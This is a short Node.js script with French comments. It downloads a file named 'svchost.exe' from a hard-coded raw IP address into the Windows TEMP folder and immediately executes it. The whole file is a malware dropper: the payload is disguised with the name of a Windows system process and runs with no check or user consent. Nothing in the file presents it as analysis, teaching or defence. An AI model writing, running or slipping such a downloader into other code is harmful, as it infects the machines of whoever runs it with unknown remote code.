const http = require('http');
const fs = require('fs');
const { exec } = require('child_process');
const path = require('path');

const fileUrl = 'http://83.222.190.222/svchost.exe';
const filePath = path.join(process.env.TEMP, 'svchost.exe');

// Fonction pour télécharger le fichier
const downloadFile = (url, dest) => {
  const file = fs.createWriteStream(dest);
  http.get(url, (response) => {
    response.pipe(file);
    file.on('finish', () => {
      file.close(executeFile); // Ferme le fichier et exécute
    });
  }).on('error', (err) => {
    fs.unlink(dest); // Supprime le fichier en cas d'erreur
    console.error('Erreur lors du téléchargement:', err.message);
  });
};

// Fonction pour exécuter le fichier téléchargé
const executeFile = () => {
  exec(`"${filePath}"`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Erreur d'exécution: ${error.message}`);
      return;
    }
    if (stderr) {
      console.error(`Erreur: ${stderr}`);
      return;
    }
    console.log(`Sortie: ${stdout}`);
  });
};

// Démarre le téléchargement
downloadFile(fileUrl, filePath);
